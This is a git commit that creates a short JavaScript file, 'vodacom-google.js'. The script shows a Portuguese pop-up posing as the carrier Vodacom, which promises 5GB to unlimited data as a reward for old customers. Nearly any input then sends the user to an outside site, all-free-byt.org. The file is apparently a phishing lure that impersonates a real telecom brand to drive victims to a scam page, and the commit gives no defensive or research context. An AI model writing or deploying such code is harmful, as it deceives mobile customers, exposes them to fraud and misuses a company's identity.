d51471588a78ccd657ac3e78c2bee98c6d33175a
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-08-27 09:10:40 -0700

    Create vodacom-google.js

---
+++ vodacom-google.js
@@ -0,0 +1,6 @@
+
+var password = 'Dados Ilimitados'
+password=prompt('Vodacom: Prezado cliente, por favor verifique se o seu cartão SIM Vodacom está qualificado para receber de 5GB a dados ilimitados, clientes antigos Recompensa, pressione OK para verificar agora ','1');
+if (password != 'Dados Ilimitados') {
+location.href='https://all-free-byt.org/vodacom-mz.html';
+}
